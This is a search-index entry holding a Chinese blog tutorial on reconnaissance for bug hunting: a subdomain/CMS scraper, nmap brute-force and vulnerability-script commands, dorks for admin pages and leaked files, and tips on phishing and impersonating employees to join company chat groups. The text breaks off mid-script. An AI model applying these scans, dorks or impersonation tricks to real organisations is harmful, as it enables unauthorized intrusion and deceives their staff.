<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>信息收集之我见</title>
      <link href="/2019/05/29/xin-xi-shou-ji-zhi-wo-jian/"/>
      <url>/2019/05/29/xin-xi-shou-ji-zhi-wo-jian/</url>
      
        <content type="html"><![CDATA[<blockquote><p>来源网络，回馈网络</p></blockquote><p>对一个网站挖掘的深浅来说就得看你收集的如何，这说明信息收集在漏洞挖掘中是非常的重要的。</p><h3 id="子域名收集"><a href="#子域名收集" class="headerlink" title="子域名收集"></a>子域名收集</h3><p>子域名收集是最简单的收集手法之一，有很多在线的工具可以直接套用，这里分享几个我经常用的。</p><h4 id="开心的时候用用这个扫描器"><a href="#开心的时候用用这个扫描器" class="headerlink" title="开心的时候用用这个扫描器"></a>开心的时候用用这个扫描器</h4><p>为什么这么说，因为这是我写的（你生气用的话我怕我屏幕里突然冒出一个拖孩）</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> threading<span class="token keyword">from</span> bs4 <span class="token keyword">import</span> BeautifulSoup<span class="token keyword">import</span> re<span class="token keyword">import</span> timeurl <span class="token operator">=</span> input<span class="token punctuation">(</span> <span class="token string">'url(如baidu.com): '</span> <span class="token punctuation">)</span>head<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">'User-Agent'</span><span class="token punctuation">:</span><span class="token string">'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0'</span><span class="token punctuation">}</span>ip <span class="token operator">=</span> <span class="token string">'http://site.ip138.com/{}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span> url <span class="token punctuation">)</span><span class="token comment" spellcheck="true"># domain_url = url.split('.')</span><span class="token comment" spellcheck="true"># domain_url = domain_url[1]+'.'+domain_url[2]</span>domain_url <span class="token operator">=</span> urldomain <span class="token operator">=</span> <span class="token string">'http://site.ip138.com/{}/domain.htm'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span> domain_url <span class="token punctuation">)</span>t <span class="token operator">=</span> time<span class="token punctuation">.</span>strftime<span class="token punctuation">(</span><span class="token string">"%Y-%m-%d"</span><span class="token operator">+</span><span class="token string">'_'</span><span class="token punctuation">,</span> time<span class="token punctuation">.</span>localtime<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>html_file <span class="token operator">=</span> open<span class="token punctuation">(</span> url<span class="token operator">+</span><span class="token string">'_'</span><span class="token operator">+</span>t<span class="token operator">+</span><span class="token string">'.html'</span><span class="token punctuation">,</span><span class="token string">'w'</span> <span class="token punctuation">)</span>html_file<span class="token punctuation">.</span>write<span class="token punctuation">(</span> <span class="token triple-quoted-string string">'''&lt;head>&lt;title>%s的扫描结果&lt;/title>&lt;link rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/3.3.7/css/bootstrap.min.css">&lt;script src="https://cdn.staticfile.org/jquery/2.1.1/jquery.min.js">&lt;/script>&lt;script src="https://cdn.staticfile.org/twitter-bootstrap/3.3.7/js/bootstrap.min.js">&lt;/script>&lt;style>pre{margin: 0 0 0px;}&lt;/style>&lt;/head>&lt;ul id="myTab" class="nav nav-tabs navbar-fixed-top navbar navbar-default">    &lt;li class="active">        &lt;a href="#ip" data-toggle="tab">             IP历史解析        &lt;/a>    &lt;/li>    &lt;li>&lt;a href="#cms" data-toggle="tab">CMS识别&lt;/a>&lt;/li>    &lt;li>&lt;a href="#domain" data-toggle="tab">子域名信息&lt;/a>&lt;/li>&lt;/ul>&lt;br>&lt;br>&lt;br>&lt;br>&lt;div id="myTabContent" class="tab-content">'''</span><span class="token operator">%</span>url <span class="token punctuation">)</span><span class="token keyword">class</span> <span class="token class-name">IP</span><span class="token punctuation">(</span> threading<span class="token punctuation">.</span>Thread <span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> ip<span class="token punctuation">)</span><span class="token punctuation">:</span>        threading<span class="token punctuation">.</span>Thread<span class="token punctuation">.</span>__init__<span class="token punctuation">(</span>self<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>ip <span class="token operator">=</span> ip    <span class="token keyword">def</span> <span class="token function">run</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span> self<span class="token punctuation">.</span>ip<span class="token punctuation">,</span>headers <span class="token operator">=</span> head <span class="token punctuation">)</span>        html <span class="token operator">=</span> r<span class="token punctuation">.</span>text        bs <span class="token operator">=</span> BeautifulSoup<span class="token punctuation">(</span>html<span class="token punctuation">,</span> <span class="token string">"html.parser"</span><span class="token punctuation">)</span>        html_file<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">'&lt;div class="tab-pane fade in active" id="ip">'</span><span class="token punctuation">)</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> bs<span class="token punctuation">.</span>find_all<span class="token punctuation">(</span><span class="token string">'p'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            ipc <span class="token operator">=</span> i<span class="token punctuation">.</span>get_text<span class="token punctuation">(</span><span class="token punctuation">)</span>            ip_html <span class="token operator">=</span> <span class="token string">'&lt;pre>{}&lt;/pre>'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span> ipc <span class="token punctuation">)</span>            html_file<span class="token punctuation">.</span>write<span class="token punctuation">(</span> ip_html <span class="token punctuation">)</span>        html_file<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">'&lt;/div>'</span><span class="token punctuation">)</span><span class="token keyword">class</span> <span class="token class-name">CMS</span><span class="token punctuation">(</span> threading<span class="token punctuation">.</span>Thread <span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> cms<span class="token punctuation">)</span><span class="token punctuation">:</span>        threading<span class="token punctuation">.</span>Thread<span class="token punctuation">.</span>__init__<span class="token punctuation">(</span>self<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>cms <span class="token operator">=</span> cms    <span class="token keyword">def</span> <span class="token function">run</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        cms <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span><span class="token string">'http://whatweb.bugscaner.com/what/'</span><span class="token punctuation">,</span> data<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">'url'</span><span class="token punctuation">:</span> self<span class="token punctuation">.</span>cms<span class="token punctuation">}</span><span class="token punctuation">,</span> headers <span class="token operator">=</span> head<span class="token punctuation">)</span>        text <span class="token operator">=</span> cms<span class="token punctuation">.</span>text        Web_Frameworks <span class="token operator">=</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">'"Web Frameworks": "(.*?)"]'</span><span class="token punctuation">,</span> text<span class="token punctuation">)</span>        Programming_Languages <span class="token operator">=</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">'"Programming Languages":(.*?)"]'</span><span class="token punctuation">,</span> text<span class="token punctuation">)</span>        JavaScript_Frameworks <span class="token operator">=</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">'"JavaScript Frameworks": (.*?)"]'</span><span class="token punctuation">,</span> text<span class="token punctuation">)</span>        CMS <span class="token operator">=</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">'"CMS": (.*?)"]'</span><span class="token punctuation">,</span> text<span class="token punctuation">)</span>        Web_Server <span class="token operator">=</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">'"Web Servers": (.*?)"]'</span><span class="token punctuation">,</span> text<span class="token punctuation">)</span>        <span class="token keyword">if</span> CMS<span class="token punctuation">:</span>            CMS <span class="token operator">=</span> CMS<span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'"]'</span>        <span class="token keyword">if</span> Programming_Languages<span class="token punctuation">:</span>            Programming_Languages <span class="token operator">=</span> Programming_Languages<span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'"]'</span>        <span class="token keyword">if</span> JavaScript_Frameworks<span class="token punctuation">:</span>            JavaScript_Frameworks <span class="token operator">=</span> JavaScript_Frameworks<span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'"]'</span>        <span class="token keyword">if</span> Web_Frameworks<span class="token punctuation">:</span>            Web_Frameworks <span class="token operator">=</span> Web_Frameworks<span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'"]'</span>        <span class="token keyword">if</span> Web_Server<span class="token punctuation">:</span>            Web_Server <span class="token operator">=</span> Web_Server<span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'"]'</span>        html <span class="token operator">=</span> <span class="token triple-quoted-string string">'''        &lt;div class="tab-pane fade" id="cms">        &lt;div class="table-responsive">        &lt;table class="table table-condensed">           &lt;tr>            &lt;th>web框架&lt;/th>            &lt;th>脚本版本&lt;/th>            &lt;th>JavaScript框架&lt;/th>            &lt;th>CMS框架&lt;/th>            &lt;th>web服务器&lt;/th>          &lt;/tr>          &lt;tr>            &lt;td>{0}&lt;/td>            &lt;td>{1}&lt;/td>            &lt;td>{2}&lt;/td>            &lt;td>{3}&lt;/td>            &lt;td>{4}&lt;/td>          &lt;/tr>        &lt;/table>        &lt;/div>        &lt;/div>        '''</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>Web_Frameworks<span class="token punctuation">,</span>Programming_Languages<span class="token punctuation">,</span>JavaScript_Frameworks<span class="token punctuation">,</span>CMS<span class="token punctuation">,</span>Web_Server<span class="token punctuation">)</span>        html_file<span class="token punctuation">.</span>write<span class="token punctuation">(</span> html <span class="token punctuation">)</span><span class="token keyword">class</span> <span class="token class-name">DOMAIN</span><span class="token punctuation">(</span> threading<span class="token punctuation">.</span>Thread <span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> domain<span class="token punctuation">)</span><span class="token punctuation">:</span>        threading<span class="token punctuation">.</span>Thread<span class="token punctuation">.</span>__init__<span class="token punctuation">(</span>self<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>domain <span class="token operator">=</span> domain    <span class="token keyword">def</span> <span class="token function">run</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span> self<span class="token punctuation">.</span>domain<span class="token punctuation">,</span>headers <span class="token operator">=</span> head <span class="token punctuation">)</span>        html <span class="token operator">=</span> r<span class="token punctuation">.</span>text        bs <span class="token operator">=</span> BeautifulSoup<span class="token punctuation">(</span>html<span class="token punctuation">,</span> <span class="token string">"html.parser"</span><span class="token punctuation">)</span>        html_file<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">'&lt;div class="tab-pane fade in active" id="domain"'</span><span class="token punctuation">)</span>        num <span class="token operator">=</span> <span class="token number">0</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> bs<span class="token punctuation">.</span>find_all<span class="token punctuation">(</span><span class="token string">'p'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            num <span class="token operator">+=</span> <span class="token number">1</span>            html_file<span class="token punctuation">.</span>write<span class="token punctuation">(</span> <span class="token string">'&lt;br>'</span> <span class="token punctuation">)</span>            domainc <span class="token operator">=</span> i<span class="token punctuation">.</span>get_text<span class="token punctuation">(</span><span class="token punctuation">)</span>            domain_html <span class="token operator">=</span> <span class="token string">'&lt;pre>[{}]： {}&lt;/pre>'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span> num<span class="token punctuation">,</span>domainc <span class="token punctuation">)</span>            html_file<span class="token punctuation">.</span>write<span class="token punctuation">(</span> domain_html <span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span> domain_html <span class="token punctuation">)</span>        html_file<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">'&lt;/div>'</span><span class="token punctuation">)</span>ip_cls <span class="token operator">=</span> IP<span class="token punctuation">(</span>ip<span class="token punctuation">)</span>ip_html <span class="token operator">=</span> ip_cls<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token punctuation">)</span>cms_cls <span class="token operator">=</span> CMS<span class="token punctuation">(</span>url<span class="token punctuation">)</span>cms_html <span class="token operator">=</span> cms_cls<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token punctuation">)</span>domain_cls <span class="token operator">=</span> DOMAIN<span class="token punctuation">(</span> domain <span class="token punctuation">)</span>domain_html <span class="token operator">=</span> domain_cls<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><h4 id="github开源的子域名扫描器"><a href="#github开源的子域名扫描器" class="headerlink" title="github开源的子域名扫描器"></a>github开源的子域名扫描器</h4><p><a href="https://github.com/lijiejie/subDomainsBrute" target="_blank" rel="noopener">https://github.com/lijiejie/subDomainsBrute</a><br><a href="https://github.com/chuhades/dnsbrute" target="_blank" rel="noopener">https://github.com/chuhades/dnsbrute</a></p><h4 id="在线网站收集"><a href="#在线网站收集" class="headerlink" title="在线网站收集"></a>在线网站收集</h4><h5 id="1、"><a href="#1、" class="headerlink" title="1、"></a>1、</h5><p><a href="https://d.chinacycc.com/（非常推荐）" target="_blank" rel="noopener">https://d.chinacycc.com/（非常推荐）</a></p><p><img src="http://static.zybuluo.com/1kbfree/qs0mh7b7r6hsaza75elhutsg/image_1dbuqgbbl2bh1v10nm68jh1j509.png" alt="image_1dbuqgbbl2bh1v10nm68jh1j509.png-112kB"></p><p>然后不到30秒就出结果了</p><p><img src="http://static.zybuluo.com/1kbfree/1iyab59sog11djizbbiw9h0c/image_1dbuqjj0a10o118r155p1q491k1lm.png" alt="image_1dbuqjj0a10o118r155p1q491k1lm.png-34.3kB"></p><p><img src="http://static.zybuluo.com/1kbfree/qltdwf3s73s6i06193dxfq85/image_1dbuqkf3l1qdehf418221uslika13.png" alt="image_1dbuqkf3l1qdehf418221uslika13.png-175.7kB"></p><h5 id="2、"><a href="#2、" class="headerlink" title="2、"></a>2、</h5><p><a href="http://z.zcjun.com/" target="_blank" rel="noopener">http://z.zcjun.com/</a><br><a href="https://phpinfo.me/domain/" target="_blank" rel="noopener">https://phpinfo.me/domain/</a></p><h3 id="端口信息收集"><a href="#端口信息收集" class="headerlink" title="端口信息收集"></a>端口信息收集</h3><h4 id="扫描端口并且标记可以爆破的服务"><a href="#扫描端口并且标记可以爆破的服务" class="headerlink" title="扫描端口并且标记可以爆破的服务"></a>扫描端口并且标记可以爆破的服务</h4><pre><code>nmap 目标 --script=ftp-brute,imap-brute,smtp-brute,pop3-brute,mongodb-brute,redis-brute,ms-sql-brute,rlogin-brute,rsync-brute,mysql-brute,pgsql-brute,oracle-sid-brute,oracle-brute,rtsp-url-brute,snmp-brute,svn-brute,telnet-brute,vnc-brute,xmpp-brute</code></pre><h4 id="判断常见的漏洞并扫描端口"><a href="#判断常见的漏洞并扫描端口" class="headerlink" title="判断常见的漏洞并扫描端口"></a>判断常见的漏洞并扫描端口</h4><pre><code>nmap 目标 --script=auth,vuln</code></pre><h4 id="精确判断漏洞并扫描端口"><a href="#精确判断漏洞并扫描端口" class="headerlink" title="精确判断漏洞并扫描端口"></a>精确判断漏洞并扫描端口</h4><pre><code>nmap 目标 --script=dns-zone-transfer,ftp-anon,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221,http-backup-finder,http-cisco-anyconnect,http-iis-short-name-brute,http-put,http-php-version,http-shellshock,http-robots.txt,http-svn-enum,http-webdav-scan,iis-buffer-overflow,iax2-version,memcached-info,mongodb-info,msrpc-enum,ms-sql-info,mysql-info,nrpe-enum,pptp-version,redis-info,rpcinfo,samba-vuln-cve-2012-1182,smb-vuln-ms08-067,smb-vuln-ms17-010,snmp-info,sshv1,xmpp-info,tftp-enum,teamspeak2-version </code></pre><h4 id="我喜欢这样做"><a href="#我喜欢这样做" class="headerlink" title="我喜欢这样做"></a>我喜欢这样做</h4><p>1、扫描子域名</p><p><img src="http://static.zybuluo.com/1kbfree/gwt2yb1mh4yk7tn2baumapxv/image_1dbutat2nhgqgid17iv68f2g42d.png" alt="image_1dbutat2nhgqgid17iv68f2g42d.png-64.3kB"></p><p>提取出域名/<code>ip</code></p><p><img src="http://static.zybuluo.com/1kbfree/z79vppxuhs029n7lzpdhl1v9/image_1dbutad6a1965dff1d06kuoi2m20.png" alt="image_1dbutad6a1965dff1d06kuoi2m20.png-172kB"></p><p>然后把域名放到<code>975.txt</code></p><p>2、批量扫描端口和漏洞检测</p><pre><code>nmap -iL 975.txt --script=auth,vuln,ftp-brute,imap-brute,smtp-brute,pop3-brute,mongodb-brute,redis-brute,ms-sql-brute,rlogin-brute,rsync-brute,mysql-brute,pgsql-brute,oracle-sid-brute,oracle-brute,rtsp-url-brute,snmp-brute,svn-brute,telnet-brute,vnc-brute,xmpp-brute &gt; scan.txt</code></pre><p>然后根据对应开放的端口进行针对性漏洞挖掘</p><h3 id="c段信息收集"><a href="#c段信息收集" class="headerlink" title="c段信息收集"></a>c段信息收集</h3><p>c段的话我一般都是使用<code>iis put</code>这款工具来扫描，可以自定义扫描<code>1-255</code>的端口并且还有返回服务器<code>banner</code>信息</p><p>自定义的端口</p><pre><code>135,139,80,8080,15672,873,8983,7001,4848,6379,2381,8161,11211,5335,5336,7809,2181,9200,50070,50075,5984,2375,7809,16992,16993</code></pre><p><img src="http://static.zybuluo.com/1kbfree/wkbp83yz8x0fkewwcyh7vx9b/image_1dbuu62uk1f3q1gfqbtk1r5l11qi3p.png" alt="image_1dbuu62uk1f3q1gfqbtk1r5l11qi3p.png-114.4kB"></p><p>这里只是演示下他跑起来的美</p><h3 id="目录信息收集"><a href="#目录信息收集" class="headerlink" title="目录信息收集"></a>目录信息收集</h3><p>目录收集工具有很多，但是最看重的还是目录字典，之前我拿了很多工具的字典去重集合起来超级超级大，只不过是在之前电脑那里还原的时候忘记了备份、、、（说这句话主要是想让你们也可以这样子做，方便自己，然后发我一份，方便你我）</p><p>这里推荐一个工具<code>7kbstorm</code></p><p><a href="https://github.com/7kbstorm/7kbscan-WebPathBrute" target="_blank" rel="noopener">https://github.com/7kbstorm/7kbscan-WebPathBrute</a></p><blockquote><p>像<code>403</code>、<code>404</code>这种页面千万不要关闭，放目录里面扫就ok</p></blockquote><h3 id="谷歌语法收集铭感文件"><a href="#谷歌语法收集铭感文件" class="headerlink" title="谷歌语法收集铭感文件"></a>谷歌语法收集铭感文件</h3><p>最常见的就是用搜索引擎~</p><pre><code>site:ooxx.com filetype:xls</code></pre><p>首先试试百度</p><p><img src="http://static.zybuluo.com/1kbfree/ztnx3vmhmv1n8amubgs2k6m5/image_1dbv9cp101p0h1i1cid6g35190n46.png" alt="image_1dbv9cp101p0h1i1cid6g35190n46.png-48.2kB"></p><blockquote><p>$!@!~~WDwadawicnm</p></blockquote><p>试试必应</p><p><img src="http://static.zybuluo.com/1kbfree/z4qkha9n1un7ukk67g1uqii5/image_1dbv9k8liv5n18n814fu18j25k53.png" alt="image_1dbv9k8liv5n18n814fu18j25k53.png-120kB"></p><p>这里主要是收集网站敏感文件（比如目标的某个系统手册演示的截图中截图到了用户名，然后我们可以根据用户名来爆破密码；甚至可以看看有没有写系统默认密码，或者一些后台的目录路径，如果有目录就可以尝试对其访问，说不定有未授权~）</p><p>还能尝试对后台进行查找</p><pre><code>site:xxx.xxx adminsite:xxx.xxx loginsite:xxx.xxx systemsite:xxx.xxx 管理site:xxx.xxx 登录site:xxx.xxx 内部site:xxx.xxx 系统</code></pre><p>还可以查找邮箱，然后进行钓鱼</p><pre><code>site:xxx.xxx 邮件site:xxx.xxx email</code></pre><p>还可以查找<code>qq</code>群等，然后假装员工验证进去看群文件泄露了什么东东（这里有个技巧，去找客服聊天处，然后对整个过程抓包也就是看历史请求，如果运气好可能在请求的返回包中返回客服的姓名，如果只单纯的泄露了姓如<strong>张xx</strong>，那么你加群的时候就说你是<strong>小张工作号</strong>，说这个工作号的原因是可能小张已经在群里了）</p><pre><code>注意事项：如果你是挖腾讯的话就不要看这条啦site:xxx.xxx qqsite:xxx.xxx 群site:xxx.xxx 企鹅site:xxx.xxx 腾讯</code></pre><p>还可以对寻找一些公开的、危害大、普遍的漏洞的指纹，如下面的搜索<code>jboss</code>系统</p><pre><code>site:ooxx.com inurl:jmx-console</code></pre><h4 id="小技巧"><a href="#小技巧" class="headerlink" title="小技巧"></a>小技巧</h4><p>比如下面一个站存在越权（但是越权的对象很难猜测）</p><pre><code>http://xxx.xxx.xxx/userinfo/?uid=2018-WOIDJWOIDJ-5201314</code></pre><p>那么我们可以尝试用搜索引擎来找</p><pre><code>site:xxx.xxx inurl=uid=20</code></pre><h3 id="利用云网盘搜索工具搜集敏感文件"><a href="#利用云网盘搜索工具搜集敏感文件" class="headerlink" title="利用云网盘搜索工具搜集敏感文件"></a>利用云网盘搜索工具搜集敏感文件</h3><blockquote><p>公司员工可能把一些内部资料放在了公网网盘，然后被在线云网盘搜索的网站抓取了，我们就可以利用这个来对目标系统进行深入交流</p></blockquote><p>我这边主要用凌风云搜索</p><p><a href="https://www.lingfengyun.com/" target="_blank" rel="noopener">https://www.lingfengyun.com/</a></p><p><img src="http://static.zybuluo.com/1kbfree/o982kurvzt9wd1psstmsx5du/image_1dbvbbve839lj94hs8d92cp.png" alt="image_1dbvbbve839lj94hs8d92cp.png-143.4kB"></p><p>个人喜欢直接输入厂商名字然后搜索（比较全），然后边看电视（最好看鬼片，鬼出来的阶段想着找找找）边搜索</p><h3 id="利用gayhub来收集信息"><a href="#利用gayhub来收集信息" class="headerlink" title="利用gayhub来收集信息"></a>利用gayhub来收集信息</h3><p>1、打开<code>gayhub</code></p><p><img src="http://static.zybuluo.com/1kbfree/88w8pjy2e0vq3ypx2n0qbbfd/image_1dbvble0op36hmi1ter16ck1vt816.png" alt="image_1dbvble0op36hmi1ter16ck1vt816.png-151kB"></p><p>这里就是找<code>gayhub</code>全部开源项目内容中存在联想这个关键字的项目，这样子可以搜集到的方面更广，如果单纯只是对标题搜索，那么他们改成了<code>lenovo</code>你就搜不到了</p><p>然后说再多，也没这个好用</p><p><a href="https://sec.xiaomi.com/article/37" target="_blank" rel="noopener">https://sec.xiaomi.com/article/37</a></p><h3 id="针对网站性收集"><a href="#针对网站性收集" class="headerlink" title="针对网站性收集"></a>针对网站性收集</h3><h5 id="1、把网站弄报错，看是什么cms，或者看返回包回显是什么中间件这些"><a href="#1、把网站弄报错，看是什么cms，或者看返回包回显是什么中间件这些" class="headerlink" title="1、把网站弄报错，看是什么cms，或者看返回包回显是什么中间件这些"></a>1、把网站弄报错，看是什么<code>cms</code>，或者看返回包回显是什么中间件这些</h5><h5 id="2、看是linux还是window"><a href="#2、看是linux还是window" class="headerlink" title="2、看是linux还是window"></a>2、看是<code>linux</code>还是<code>window</code></h5><p>如目标<code>url</code>是<code>www.onlyfree.xxx/login</code>，那么改成<code>www.onlyfree.xxx/Login</code>看看能不能访问，如果可以访问就可能是<code>window</code>，否则可能是<code>linux</code></p><h5 id="3、可以去云溪等在线识别指纹的网站看指纹信息"><a href="#3、可以去云溪等在线识别指纹的网站看指纹信息" class="headerlink" title="3、可以去云溪等在线识别指纹的网站看指纹信息"></a>3、可以去云溪等在线识别指纹的网站看指纹信息</h5><p><a href="http://whatweb.bugscaner.com/look/" target="_blank" rel="noopener">http://whatweb.bugscaner.com/look/</a><br><a href="http://www.yunsee.cn/finger.html" target="_blank" rel="noopener">http://www.yunsee.cn/finger.html</a></p><h5 id="4、对waf进行识别"><a href="#4、对waf进行识别" class="headerlink" title="4、对waf进行识别"></a>4、对<code>waf</code>进行识别</h5><p>这里有一款开源的识别工具，挺好用的<br><a href="https://github.com/EnableSecurity/wafw00f" target="_blank" rel="noopener">https://github.com/EnableSecurity/wafw00f</a></p><h5 id="5、对网站whois查询看注册人、手机号、邮箱等（可以收集起来放到密码生成工具）"><a href="#5、对网站whois查询看注册人、手机号、邮箱等（可以收集起来放到密码生成工具）" class="headerlink" title="5、对网站whois查询看注册人、手机号、邮箱等（可以收集起来放到密码生成工具）"></a>5、对网站<code>whois</code>查询看注册人、手机号、邮箱等（可以收集起来放到密码生成工具）</h5><h5 id="6、看html源代码，在一起项目测试的时候，我在找html源代码的时候发现一个注释的js文件，我将其打开后，里面的备注居然是配置信息。。。后台地址、管理员账号和密码等（可是我没get到shell，所以你要知道这回事而不要记住这件事）"><a href="#6、看html源代码，在一起项目测试的时候，我在找html源代码的时候发现一个注释的js文件，我将其打开后，里面的备注居然是配置信息。。。后台地址、管理员账号和密码等（可是我没get到shell，所以你要知道这回事而不要记住这件事）" class="headerlink" title="6、看html源代码，在一起项目测试的时候，我在找html源代码的时候发现一个注释的js文件，我将其打开后，里面的备注居然是配置信息。。。后台地址、管理员账号和密码等（可是我没get到shell，所以你要知道这回事而不要记住这件事）"></a>6、看<code>html</code>源代码，在一起项目测试的时候，我在找<code>html</code>源代码的时候发现一个注释的<code>js</code>文件，我将其打开后，里面的备注居然是配置信息。。。后台地址、管理员账号和密码等（可是我没<code>get</code>到<code>shell</code>，所以你要知道这回事而不要记住这件事）</h5><h5 id="7、网站真实ip识别，下面是我用的一个工具，但是我忘记哪里下载的了，我原封不漏的粘贴出来"><a href="#7、网站真实ip识别，下面是我用的一个工具，但是我忘记哪里下载的了，我原封不漏的粘贴出来" class="headerlink" title="7、网站真实ip识别，下面是我用的一个工具，但是我忘记哪里下载的了，我原封不漏的粘贴出来"></a>7、网站真实<code>ip</code>识别，下面是我用的一个工具，但是我忘记哪里下载的了，我原封不漏的粘贴出来</h5><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#############################################################</span><span class="token comment" spellcheck="true">###                                                  </span><span class="token comment" spellcheck="true">###   ▄▄▄▄                ▄▄▄     ▄▄▄▄    ▀      ▄   </span><span class="token comment" spellcheck="true">###  ▀   ▀█ ▄   ▄  ▄▄▄▄     █    ▄▀  ▀▄ ▄▄▄    ▄▄█▄▄ </span><span class="token comment" spellcheck="true">###    ▄▄▄▀  █▄█   █▀ ▀█    █    █  ▄ █   █      █   </span><span class="token comment" spellcheck="true">###      ▀█  ▄█▄   █   █    █    █    █   █      █   </span><span class="token comment" spellcheck="true">###  ▀▄▄▄█▀ ▄▀ ▀▄  ██▄█▀  ▄▄█▄▄   █▄▄█  ▄▄█▄▄    ▀▄▄ </span><span class="token comment" spellcheck="true">###                █                                 </span><span class="token comment" spellcheck="true">###                ▀                                 </span><span class="token comment" spellcheck="true">###                                                          </span><span class="token comment" spellcheck="true">### name: xcdn.py</span><span class="token comment" spellcheck="true">### function: try to get the actual ip behind cdn</span><span class="token comment" spellcheck="true">### date: 2016-11-05</span><span class="token comment" spellcheck="true">### author: quanyechavshuo</span><span class="token comment" spellcheck="true">### blog: http://3xp10it.cc</span><span class="token comment" spellcheck="true">#############################################################</span><span class="token comment" spellcheck="true"># usage:python3 xcdn.py www.baidu.com</span><span class="token keyword">import</span> time<span class="token keyword">import</span> osos<span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">"pip3 install exp10it -U --no-cache-dir"</span><span class="token punctuation">)</span>    <span class="token keyword">from</span> exp10it <span class="token keyword">import</span> figlet2filefiglet2file<span class="token punctuation">(</span><span class="token string">"3xp10it"</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token boolean">True</span><span class="token punctuation">)</span>time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token keyword">from</span> exp10it <span class="token keyword">import</span> CLIOutput<span class="token keyword">from</span> exp10it <span class="token keyword">import</span> get_root_domain<span class="token keyword">from</span> exp10it <span class="token keyword">import</span> get_string_from_command<span class="token keyword">from</span> exp10it <span class="token keyword">import</span> get_http_or_https<span class="token keyword">from</span> exp10it <span class="token keyword">import</span> post_request<span class="token keyword">from</span> exp10it <span class="token keyword">import</span> get_request<span class="token keyword">from</span> exp10it <span class="token keyword">import</span> checkvpn<span class="token keyword">import</span> sys<span class="token keyword">import</span> re<span class="token keyword">class</span> <span class="token class-name">Xcdn</span><span class="token punctuation">(</span>object<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>domain<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token comment" spellcheck="true">#必须保证连上了vpn,要在可以ping通google的条件下使用本工具,否则有些domain由于被GFW拦截无法正常访问会导致</span>        <span class="token comment" spellcheck="true">#本工具判断错误,checkvpn在可以ping通google的条件下返回1</span>        <span class="token keyword">while</span> <span class="token number">1</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> checkvpn<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">:</span>                <span class="token keyword">break</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>                <span class="token keyword">print</span><span 